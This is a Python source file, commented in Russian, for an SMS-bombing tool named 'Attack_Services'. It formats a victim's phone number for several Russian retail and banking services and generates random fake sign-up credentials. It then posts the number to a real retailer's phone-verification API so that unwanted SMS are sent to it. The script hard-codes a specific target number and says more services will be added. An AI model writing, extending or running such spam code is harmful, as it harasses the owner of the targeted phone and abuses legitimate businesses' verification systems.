import requests
import random


class Attack_Services:

    """
    Класс в котором прописаны все запросы для спама смс
    """

    def __init__(self, code_country, phone):
        self.phone = phone
        self.code_country = code_country


    def code_countre_processing(self):
        """

        Оюработка кода страны в корректный вид для функций
        :return: None

        """
        if self.code_country[0] == '+':
            self.code_country = self.code_country[1:]


    def number_processsing(self):
        """

        Соединкник кода страны в одну строку для конечной функции спама и проверка на лишние знаки
        :return: None

        """
        self.phone = self.code_country + self.phone[-10:]
        for lett in self.phone:
            if lett not in '1234567890':
                print('Что то тут не так, надо фиксить')

    def creat_name_pass_username(self):
        """

        Функция создает данные для форм отправки запросов для отправки сообщейний

        :return: None

        """

        self.name = ''
        for i in range(12):
            self.name = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.password = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.username = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    def editing_phone(self):
        """

        Редактирование номера под отдельные сервисы

        :return: None
        """

        self.phone9 = self.phone[1:]
        self.phoneAresBank = '+' + self.code_country + '(' + self.phone[-10:-7] + ')' + self.phone[-7:-4] + '-' + self.phone[-4:-2] + '-' + self.phone[-2:]
        self.phone9dostavista = self.code_country + self.phone[:-7] + '+' + self.phone9[-7:-5] + '-' + self.phone9[-5:-3] + '-' + self.phone9[-3:]
        self.phoneOstin = '+' + self.code_country + '+(' + self.phone[-10:-7] + ')' + self.phone[-7:-4] + '-' + self.phone[ -4:-2] + '-' + self.phone[-2:]
        self.phonePizzahut = '+' + self.code_country + ' (' + self.phone[-10:-7] + ') ' + self.phone[-7:-4] + ' ' + self.phone[ -4:-2] + ' ' + self.phone[-2:]
        self.phoneGorzdrav = self.phone[-10:-7] + ') ' + self.phone[-7:-4] + '-' + self.phone[-4:-2] + '-' + self.phone[-2:]

    def spam(self):
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': self.phone}, headers={})
        # Пока на данный момент не буду прописывать остальные сервисы для спама, сначала сделаю интерфейс проги

if __name__ == "__main__":
    a = Attack_Services('+7', '89041758061')
    a.code_countre_processing()
    a.number_processsing()
    a.creat_name_pass_username()
    a.editing_phone()
    a.spam()